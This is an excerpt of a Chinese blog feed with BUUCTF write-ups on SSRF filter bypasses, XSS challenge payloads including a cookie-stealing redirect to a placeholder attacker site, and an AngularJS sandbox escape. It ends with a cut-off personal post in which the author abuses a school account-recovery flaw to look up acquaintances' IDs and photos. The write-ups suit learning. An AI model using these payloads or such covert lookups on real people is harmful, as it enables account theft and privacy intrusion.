href="https://blog.csdn.net/qq_39458856/article/details/81809738?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-81809738-blog-111668038.pc_relevant_multi_platform_whitelistv2&spm=1001.2101.3001.4242.1&utm_relevant_index=3">链接</a></p><p>那么举个例子，parse_url()会把1个url字符串解析成下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-string">&quot;http://a:@127.0.0.1:80@baidu.com/flag.php&quot;</span>;<br><span class="hljs-variable">$parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parse</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*输出: </span><br><span class="hljs-comment">array(5) &#123;</span><br><span class="hljs-comment">  [&quot;scheme&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;http&quot;</span><br><span class="hljs-comment">  [&quot;host&quot;]=&gt;</span><br><span class="hljs-comment">  string(9) &quot;baidu.com&quot;</span><br><span class="hljs-comment">  [&quot;user&quot;]=&gt;</span><br><span class="hljs-comment">  string(1) &quot;a&quot;</span><br><span class="hljs-comment">  [&quot;pass&quot;]=&gt;</span><br><span class="hljs-comment">  string(13) &quot;@127.0.0.1:80&quot;</span><br><span class="hljs-comment">  [&quot;path&quot;]=&gt;</span><br><span class="hljs-comment">  string(9) &quot;/flag.php&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>这个题的关键，在于parse_url(和curl_setopt()的解析url方式的8同: curl会匹配第一个@后的，而parse_url则匹配第二个@后的<br><img src="/images/%E5%88%B7%E9%A2%98/buuctf(4).png"><br>构造payload: </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">url=http:<span class="hljs-regexp">//a</span>:@127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>@baidu.com/flag.php<br></code></pre></td></tr></table></figure><p>被parse_url()解析为: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">5</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;baidu.com&quot;</span><br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;@127.0.0.1:80&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/flag.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是curl则会匹配第一个@后的内容，于是就绕过辽</p><h2 id="buuctf-第三章-web进阶-Python里的SSRF"><a href="#buuctf-第三章-web进阶-Python里的SSRF" class="headerlink" title="buuctf[第三章 web进阶]Python里的SSRF"></a>buuctf[第三章 web进阶]Python里的SSRF</h2><p>进入页面，扫了一圈发现p线索都没有…..啊不是，最后看了看提示: url parameter is required 翻译: 需要参数url<br>所以说学好英语是多么重要，不要老是依赖机翻…</p><p>要求是尝试访问到容器内部的 8000 端口和 url path &#x2F;api&#x2F;internal&#x2F;secret 即可获取 flag</p><p>127.0.0.1被限制，尝试绕过:<br>@失败，数制转换失败，localhost也8行，👴8行了</p><p>看了看wp，有以下几种方法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.2:8000</span>/api/internal/secret   //原理: <span class="hljs-number">127.0.0.1</span>和<span class="hljs-number">127.0.0.2</span>都是内网ip本地的默认地址，<span class="hljs-number">127.0.0.2</span>如果不是特别设置应该<span class="hljs-number">8</span>会存在...所以...<br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>:<span class="hljs-number">8000</span>/api/internal/secret      //用<span class="hljs-number">0</span>代替了<span class="hljs-number">127.0.0.1</span>，我也<span class="hljs-number">8</span>知道为什么<br><span class="hljs-attribute">http</span>://<span class="hljs-number">0.0.0.0:8000</span>/api/internal/secret   //<span class="hljs-number">127.0.0.1</span>是本机的环回地址，<span class="hljs-number">0.0.0.0</span>代表本机上任何IP地址，因此可以利用<span class="hljs-number">0.0.0.0</span>来绕过<span class="hljs-number">127.0.0.1</span>的过滤。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞学习</title>
    <link href="/2022/07/07/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/07/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>学习笔记、思路整理(损版)</p><span id="more"></span><p>用来偷别人cookie的，这样就可以用这个cookie做坏事辽(比如登录qq空间)</p><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p><a href="http://xsst.sinaapp.com/example/1-1.php">参考教程</a></p><p>首先，还是闭合<br>其次，是检查有无没有被ban的函数<br>eg: </p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xquery">page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>   //没啥用，就是弹个窗<br>page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">location.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://你自己的网站/evil.php?cookie=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>/*<br>解释: location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>; //这句话可以让当前页面(location)的地址(href)，跳转到恶意地址<span class="hljs-built_in"></span><br><span class="hljs-built_in">document</span>.cookie //就是当前页面的cookies数据<br>encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将cookies数据编码一下(防止cookies中有特殊的符号，导致地址错误)<br>location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>+encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将编码后的数据加在恶意地址之后<br>*/<br>然后是闭合，比如已知js代码: var page= <span class="hljs-string">&quot;1&quot;</span>;    //此处的<span class="hljs-number">1</span>是传入的参数page，可替换、闭合<br>http://xsst.sinapp.com/example/<span class="hljs-number">1</span>-<span class="hljs-number">2</span>.php?page=<span class="hljs-string">&quot;;alert(document.cookie);//</span><br><span class="hljs-string">http://xsst.sinapp.com/example/1-2.php?page=&quot;</span>;alert<span class="hljs-built_in">(document</span>.cookie);<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">$</span>(<span class="hljs-params">str</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/^#[^&#x27;]+&quot;[^&quot;]+&quot;\]/</span>.<span class="hljs-title function_">test</span>(str))&#123;    <span class="hljs-comment">//额 &quot; &lt;  &gt;被过滤</span><br><span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;&quot;]&#x27;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<span class="hljs-keyword">var</span> a=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-string">&quot;]&#x27;);alert(document.cookie);var a=$(&#x27;#test a[href=&quot;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="Dom-based的反射型XSS"><a href="#Dom-based的反射型XSS" class="headerlink" title="Dom-based的反射型XSS"></a>Dom-based的反射型XSS</h2><h1 id="简单实战-buuctf-web进阶-XSS闯关"><a href="#简单实战-buuctf-web进阶-XSS闯关" class="headerlink" title="简单实战: [buuctf web进阶]XSS闯关"></a>简单实战: [buuctf web进阶]XSS闯关</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>查看源码，发现无任何过滤(源码里没有js代码)，输入即可弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>查看源码，username被escape函数过滤过(escape函数: 就是把函数url编码)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>   &#125;<br><span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;7bmk&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + <span class="hljs-built_in">escape</span>(username);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那要咋闭合捏？&lt;&gt;&#x2F;()都被转化为url，可以这样构造，产生闭合var username&#x3D;’’里的’’和后面的&lt;&#x2F; script&gt;: </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>sername=<span class="hljs-string">&#x27;;alert(document.cookie);//</span><br></code></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>&#125;<br><span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;xss&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这不和上一关没区别吗，相同payload试试，发现引号被过滤了: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>&#125;<br>    <span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;\&#x27;;alert(document.cookie);//&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>但是，这个只过滤了1个引号，而不是在所有的引号前加...这我就匪夷所思啊，谁在做网站防护时会这么防…. 还只转义1个引号不转义其他的…</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;alert(1);//</span><br></code></pre></td></tr></table></figure><h2 id="第四关-伪链接"><a href="#第四关-伪链接" class="headerlink" title="第四关(伪链接)"></a>第四关(伪链接)</h2><p>页面每10s重定向1次，通过禁用js停止跳转，然后查看源代码: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">var</span> time = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">var</span> jumpUrl;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>) == <span class="hljs-literal">false</span>)&#123; <span class="hljs-comment">//getQueryVariable()用于获取url参数</span><br>jumpUrl = location.<span class="hljs-property">href</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>jumpUrl = <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">jump</span>(<span class="hljs-params">time</span>)&#123;<br><span class="hljs-keyword">if</span>(time == <span class="hljs-number">0</span>)&#123;<br>location.<span class="hljs-property">href</span> = jumpUrl;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>time = time - <span class="hljs-number">1</span> ;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">`页面<span class="hljs-subst">$&#123;time&#125;</span>秒后将会重定向到<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(jumpUrl)&#125;</span>`</span>;<br><span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br>&#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>    <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>           <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>           <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>&#125;<br><span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure><p>这关的知识点是伪链接:<br>javascript:alert(1)，浏览器会把javascript后面的那一段内容当做代码，直接在当前页面执行。<br>于是payload: </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">jumpUrl</span>=javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>困惑: 我怎么知道get传的参是jumpUrl呢? 当然是通过getQueryVariable(): getQueryVariable()用于获取url参数</p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>查看源码: </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;autosubmit&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//参数autosubmit必须要有，且要经过getQueryVariable的过滤</span><br><span class="hljs-keyword">var</span> autoForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;autoForm&#x27;</span>);    <span class="hljs-comment">//啊...类似字典吧，id是html的标签的标志....还是滚去学html吧</span><br>autoForm.<span class="hljs-property">action</span> = (<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>) == <span class="hljs-literal">false</span>) ? location.<span class="hljs-property">href</span> : <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>);<span class="hljs-comment">//还是看wp吧...这说明，先学完技巧后，还要学基础</span><br>autoForm.<span class="hljs-title function_">submit</span>();<br>&#125;<br>    <span class="hljs-keyword">else</span>&#123;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>       <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//获得当前页面get请求的指定参数(?后的部分，为1字符串)</span><br>       <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>               <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>               <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure><p>不难，审就完事了(所以里面的POST压根毫无关系就是来混淆的是吗…)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">autosubmit</span>=1&amp;action=javascript:alert(1);<br></code></pre></td></tr></table></figure><h2 id="第六关-angular沙箱逃逸"><a href="#第六关-angular沙箱逃逸" class="headerlink" title="第六关(angular沙箱逃逸)"></a>第六关(angular沙箱逃逸)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script text=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>嗯….这关的过滤没有在源代码里写，然后显示的方式是在html里而8是js，所以没法执行alert…个p<br>搜索script关键字，发现有个main.js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">_alert = alert;<br>alert = <span class="hljs-keyword">function</span>(<span class="hljs-params">info</span>)&#123;<br><span class="hljs-title function_">_alert</span>(<span class="hljs-string">&quot;过关成功！进入下一关！&quot;</span>);<br><span class="hljs-keyword">var</span> current_level = location.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/level([0-9]+)/</span>)[<span class="hljs-number">1</span>];<span class="hljs-comment">//额。。。。匹配到的第一个</span><br><span class="hljs-keyword">var</span> next_level = <span class="hljs-built_in">parseInt</span>(current_level) + <span class="hljs-number">1</span>;<br>location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;/level&quot;</span> + next_level;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后看球不懂，实际上这玩意也没啥卵用…</p><p>实际上突破点在源码里的另一处链接: <a href="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</a><br>是一个angular 1.4.6框架</p><h2 id="参考-angular-1-6沙箱逃逸"><a href="#参考-angular-1-6沙箱逃逸" class="headerlink" title="参考: angular 1.6沙箱逃逸"></a>参考: angular 1.6沙箱逃逸</h2><p><a href="https://xz.aliyun.com/t/4638">参考链接</a><br>angular是1个前端框架，在Angular1.6以前的版本，有很多绕过方式，而在这之后的版本，沙箱已被删除，为此也就8存在沙箱逃逸了</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>对于angular 1.6以下的版本，输入20，若返回的结果为20，则存在漏洞</p><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>payload:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>其中的alert(1)可被其他payload替换</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何凭实力被刚认识的女生拉黑</title>
    <link href="/2022/05/30/sh1t/"/>
    <url>/2022/05/30/sh1t/</url>
    
    <content type="html"><![CDATA[<p>由于事件过于蛋疼，你可能会以为这是我编的</p><span id="more"></span><p>总之事件过于蛋疼，以及从这件事中我获得了深刻的教训，于是我决定把这个离谱的事件记录下来以此来警示自己</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>起因是，在一些dlc以及周围的兄弟都陆续脱单后，👴也在表白墙发了个征友<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%85%88%E8%BE%88.png"></p><p>然后由于👴的直男属性基本只用了不到1天就和这些人把天全部聊死了，达成了速通成就，比拼刀还快。事故就发生在其中1位身上，下面以我的视角来回顾一下整个事件</p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>为了防骚扰，我选择了放小号，如果有人加我再大号加回去，看似和直接放大号一样没啥区别，但正是这个为后来的事故挖下了坑</p><p>在发了征友2天后，有天去登小号，发现有人来加，于是点了同意，然后大号加回去，一切看似正常</p><p>然后，凭借直男属性👴发动了技能：尬聊，妹子也不知咋回，就已读乱回<br><img src="/images/wtf/%E5%B0%AC%E8%81%8A.jpg"></p><h2 id="发现不对劲"><a href="#发现不对劲" class="headerlink" title="发现不对劲"></a>发现不对劲</h2><p>本来这也没什么，按正常发展，无非就是尬聊，对方失去耐心<del>并认为这人是不是有什么大病</del>，拉黑，在这个过程中慢慢构造payload，提高情商。问题是我没按规矩来</p><p>由于学点web，外加平时稍微注意观察，可以找出一点小bug：通过学校某些网站的申请找回账号机制，可以根据姓名获得1个人的学号\性别，根据学号区间，可以判断出年级、专业等更多信息。</p><p>当然这只是其中1个没啥卵用的小bug，由于个人感觉只是套取一下学号<del>(和他入学照片、宿舍号啥的)</del>，并不是什么很严重的搜集，因此在新认识1个校友后有时会顺手试一下。</p><p>于是我试着找了一下，然后惊讶地发现，结果分析显示，隔着屏幕和我聊天的，是1个19级的电信类大哥<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"></p><h2 id="离大谱"><a href="#离大谱" class="headerlink" title="离大谱"></a>离大谱</h2><p>虽然不知道现在有没有变化，但是通过入学照，至少可以判断出他大一的时候，长得比较草率…<br>结合到西电连食堂的筷子都是弯的的gay含量，我顿时惊出一身冷汗<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7.jfif"><br>或者是其他可能性：名字是假的，对面是某个👴认识的究极无聊的兄弟在钓🐟搞我</p><h2 id="抉择"><a href="#抉择" class="headerlink" title="抉择"></a>抉择</h2><p>于是到了这里，不管出于哪个可能，对方都撒谎了，为啥1个人要主动加我然后撒谎呢？为此我想找更多信息<br>但是我发现对方的很多信息都没法判断真假，所以短时间没法知道对方身份</p><p>选项:<br>A: 继续周旋，尝试套话以获取信息<br>B: 直接问他是什么意思，加速剧情发展</p><p>由于感觉没必要对陌生人花费精力，于是直接选择了选项B，加速剧情发展，然后👴糗大了</p><h2 id="真相-巧合"><a href="#真相-巧合" class="headerlink" title="真相: 巧合"></a>真相: 巧合</h2><p>为了不暴露，我一开始还是以学妹称呼的<br><img src="/images/wtf/%E5%BC%80%E7%9B%92(1).jpg"></p><p>然后…….前方高能反转了</p><p><img src="/images/wtf/%E5%BC%80%E7%9B%92(2).jpg"><br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"><br>这下轮到我不会了，这tm是个什么情况?<br><img 